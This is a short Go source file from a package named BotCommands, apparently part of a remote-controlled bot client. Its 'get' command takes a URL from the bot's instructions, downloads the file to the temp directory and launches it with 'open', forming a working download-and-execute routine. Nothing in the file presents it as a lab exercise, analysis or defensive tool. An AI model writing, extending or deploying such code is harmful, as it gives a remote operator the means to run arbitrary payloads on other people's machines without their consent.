package BotCommands

import (
	"fmt"
	"net/http"
	"os"
	"io"
	"strings"
	"os/exec"
)

func (botCommand *BotCommand) RunCommand() {
	switch botCommand.MainCommand {
	case "get":
		fmt.Println("[run command] get with ", botCommand.Arguments)
		commandGetAndRun(botCommand.Arguments[0])

	default:
		fmt.Println("I didn't know this commando, sorry")
	}
}

func commandGetAndRun(url string) {
	// file download
	response, err := http.Get(url)
	if err != nil {
		fmt.Println("[get command] error: ", err)
		return
	}

	defer response.Body.Close()

	// move file to temp directory
	urlSplit := strings.Split(url, "/")
	fileName := urlSplit[len(urlSplit) - 1]

	out, err := os.Create(os.TempDir() + fileName)
	if err != nil {
		fmt.Println("[get command] error: ", err)
		return
	}

	_, err = io.Copy(out, response.Body)
	if err != nil {
		fmt.Println("[get command] error: ", err)
		return
	}

	// run file
	fmt.Println(out.Name())
	cmd := exec.Command("open", out.Name())
	err = cmd.Run()
	if err != nil {
		fmt.Println("[get command] error: ", err)
	}

	//
	fmt.Println("[get command] success")
}
